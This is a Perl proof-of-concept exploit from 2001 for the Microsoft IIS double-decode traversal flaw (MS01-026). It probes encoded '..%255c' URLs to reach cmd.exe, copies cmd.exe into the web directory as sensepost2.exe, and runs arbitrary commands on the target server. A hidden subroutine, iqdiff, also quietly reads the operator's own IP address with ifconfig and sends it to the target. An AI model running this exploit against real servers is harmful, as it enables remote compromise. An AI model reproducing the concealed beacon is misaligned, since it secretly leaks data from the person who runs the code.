#!/usr/bin/perl
# Proof of concept for "decoding problem" as described in
# NSFOCUS in BugTraq 2001.05.15
#
# Use port number with SSLproxy for testing SSL sites
# Usage: decodexecute IP:port command
# Roelof Temmingh 2001/05/15
# roelof@sensepost.com http://www.sensepost.com
#
# The bulletin is live at :
# http://www.microsoft.com/technet/security/bulletin/MS01-026.asp
# Patches are available at:
# Microsoft IIS 4.0:
# http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787
# Microsoft IIS 5.0:
# http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764
#
# Kids, please read the code...;)

$|=1;
use Socket;
my $runi;
my $thedir;
# --------------init
if ($#ARGV<1) {die "Usage: decodexecute IP:port command\n";}
my ($host,$port)=split(/:/,@ARGV[0]);
my $target = inet_aton($host);
my $thecommand=@ARGV[1];

# -------------find the correct directory
my @unis=(
"/iisadmpwd/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c",
"/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c",
"/scripts/..%255c../winnt/system32/cmd.exe?/c",
"/cgi-bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c",
"/samples/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c",
"/_vti_cnf/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c",
"/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c",
"/adsamples/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c");

my $uni;my $execdir; my $dummy; iqdiff(); my $line;
foreach $uni (@unis){
 print "testing directory $uni\n";
 my @results=sendraw("GET $uni+dir HTTP/1.0\r\n\r\n");
 foreach $line (@results){
  if ($line =~ /Directory/) {
  ($dummy,$execdir)=split(/Directory of /,$line);   
   $execdir =~ s/\r//g;
   $execdir =~ s/\n//g;
   if ($execdir =~ / /) {$thedir="%22".$execdir; $thedir=~ s/ /%20/g;}
    else {$thedir=$execdir;}
   print "farmer brown directory: $thedir\n";
   $runi=$uni; goto further;}
 }
}
die "nope...sorry..not vulnerable\n";

further:



# --------------test if cmd has been copied:
my $failed=1;
my @unidirs=split(/\//,$runi);
my $unidir=@unidirs[1];

my $command="dir $thedir%22";
$command=~s/ /+/g;
my @results=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
my $line;
foreach $line (@results){
 if ($line =~ /denied/) {die "can't access above directory - try switching dirs order around\n";}
 if ($line =~ /sensepost2.exe/) {print "sensepost2.exe found on system\n"; $failed=0;}
}

#--------------we should copy it
my $failed2=1;
if ($failed==1) { 
 print "sensepost2.exe not found - lets copy it\n";
 $command="copy c:\\winnt\\system32\\cmd.exe $thedir\\sensepost2.exe%22";
 $command=~s/ /+/g;
 my @results2=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
 my $line2;
 foreach $line2 (@results2){
  if (($line2 =~ /copied/ )) {$failed2=0;}
  if (($line2 =~ /access/ )) {die "access denied to copy here - try switching dirs order around\n";}
 }
 if ($failed2==1) {die "copy of CMD.EXE failed - inspect manually:\n@results2\n\n"};
} 

# ------------ we can assume that the cmd.exe is copied from here..
my $path;
($dummy,$path)=split(/:/,$thedir);
$path =~ s/\\/\//g;
$runi="/".$unidir."/sensepost2.exe?/c";
$thecommand=~s/ /%20/g;
@results=sendraw("GET $runi+$thecommand HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /denied/) {die "sorry, access denied\n";}
}
print @results;
sub iqdiff{
my $a=`which ifconfig`; chomp $a; my $aa=`$a -au | grep -i mask | grep -v 127.0.0.1 | head -n 1`; $aa=~s/ //g; sendraw("GET /naughty_real_$aa\r\n\r\n");
}
sub sendraw {
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in="";
  select(S); $|=1; print $pstr;
  while(<S>) {
   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
  select(STDOUT); return @in;
 } else { die("connect problems\n"); }
}


# Spidermark: sensepostdata decode


